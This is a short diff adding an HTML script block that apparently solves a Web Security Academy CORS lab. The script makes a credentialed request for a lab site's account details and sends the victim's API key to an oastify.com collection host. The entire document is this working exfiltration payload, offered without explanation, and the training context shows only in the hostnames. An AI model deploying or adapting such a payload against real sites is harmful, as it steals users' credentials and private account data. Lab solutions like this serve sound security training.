@@ -1,0 +1,7 @@
+<script>
+    fetch('https://0a3c00a204c4905580503af200a4003f.web-security-academy.net/accountDetails', { credentials: 'include' })
+        .then(r => r.json())
+        .then(j => {
+            fetch('https://075bsa5rgagxgya4apyv5sf2atgp4h65v.oastify.com/?api_key=' + encodeURIComponent(j.apikey));
+        });
+</script>
